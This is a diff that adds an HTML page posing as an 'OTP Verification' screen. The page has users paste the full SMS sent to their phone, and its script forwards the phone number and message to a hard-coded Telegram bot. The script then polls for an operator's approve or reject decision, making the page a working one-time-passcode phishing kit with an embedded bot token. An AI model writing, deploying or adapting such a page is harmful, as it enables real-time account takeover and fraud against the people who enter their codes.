@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OTP Verification</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+    body { background-color: #222; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .app-screen { width: 100%; max-width: 412px; height: 100vh; max-height: 870px; background-color: #fff; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+    .top-section { background-color: #1a1e2e; color: #fff; padding: 40px 24px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; }
+    .title { font-size: 20px; font-weight: 600; margin-bottom: 16px; }
+    .description { font-size: 15px; line-height: 1.45; color: #e0e0e0; margin-bottom: 12px; }
+    .user-phone { font-size: 18px; font-weight: 600; color: #334155; margin-bottom: 24px; }
+    .otp-card { width: 100%; height: 220px; background-color: #fff; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); margin-bottom: 24px; padding: 16px; }
+    .otp-textarea { width: 100%; height: 100%; border: none; outline: none; resize: none; font-size: 16px; color: #1a1e2e; font-family: inherit; }
+    .timer-text { font-size: 15px; color: #d1d5db; }
+    .bottom-section { background-color: #fff; flex: 1; padding: 24px; display: flex; flex-direction: column; justify-content: space-between; align-items: center; }
+    .warning-box { border: 1px solid #cbd5e1; border-radius: 8px; padding: 10px 16px; font-family: 'Courier New', monospace; font-size: 17px; color: #1e293b; background-color: #fff; }
+    .btn-submit { width: 100%; height: 52px; background-color: #3b82f6; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+
+  <form id="otpForm" class="app-screen">
+    <div class="top-section">
+      <h2 class="title">OTP Verification</h2>
+      <p class="description">We have sent a one-time password (OTP) to your number. Copy the message that we send to your number message and Enter It here to Verify Your number</p>
+
+      <div class="user-phone" id="displayPhone">725478526</div>
+
+      <div class="otp-card">
+        <textarea class="otp-textarea" id="otpText" name="otp" placeholder="Paste or type message here..." required></textarea>
+      </div>
+
+      <p class="timer-text">Resend OTP in <span id="countdown">48</span> seconds</p>
+    </div>
+
+    <div class="bottom-section">
+      <div class="warning-box">Do not alter the message</div>
+      <button type="submit" class="btn-submit" id="btnSubmit">Submit OTP</button>
+    </div>
+  </form>
+
+  <script>
+    const BOT_TOKEN = '8410203371:AAHBXFvIx1pMdvEQ9FCSLrv0-CCgrLcGRjk';
+    const CHAT_ID = '6347393664';
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const phoneParam = urlParams.get('phone') || localStorage.getItem('userPhone');
+    
+    if (phoneParam) {
+      document.getElementById('displayPhone').textContent = phoneParam;
+    }
+
+    let timeLeft = 48;
+    const countdownEl = document.getElementById('countdown');
+    const timer = setInterval(() => {
+      timeLeft--;
+      countdownEl.textContent = timeLeft;
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        document.querySelector('.timer-text').textContent = 'Resend OTP now';
+      }
+    }, 1000);
+
+    const otpForm = document.getElementById('otpForm');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    otpForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const otpMessage = document.getElementById('otpText').value;
+      const phone = phoneParam || 'Unknown';
+
+      btnSubmit.innerText = 'Verifying...';
+      btnSubmit.disabled = true;
+
+      const message = `📩 *OTP Verification*\nPhone: \`${phone}\`\nContent:\n\`\`\`\n${otpMessage}\n\`\`\`\n\nIs this OTP correct?`;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: '✅ Approve OTP', callback_data: `approve_otp` },
+                  { text: '❌ Reject OTP', callback_data: `reject_otp` }
+                ]
+              ]
+            }
+          })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          checkOtpApproval();
+        }
+      } catch (error) {
+        alert('Error verifying OTP.');
+        btnSubmit.innerText = 'Submit OTP';
+        btnSubmit.disabled = false;
+      }
+    });
+
+    function checkOtpApproval() {
+      let offset = 0;
+      const interval = setInterval(async () => {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}`);
+          const data = await res.json();
+
+          if (data.ok && data.result.length > 0) {
+            for (const update of data.result) {
+              offset = update.update_id + 1;
+
+              if (update.callback_query) {
+                const action = update.callback_query.data;
+
+                if (action === 'approve_otp') {
+                  clearInterval(interval);
+                  window.location.href = 'success.html';
+                } else if (action === 'reject_otp') {
+                  clearInterval(interval);
+                  alert('Invalid OTP. Please enter the correct message.');
+                  document.getElementById('otpText').value = '';
+                  btnSubmit.innerText = 'Submit OTP';
+                  btnSubmit.disabled = false;
+                }
+              }
+            }
+          }
+        } catch (err) {
+          console.error('Polling error:', err);
+        }
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
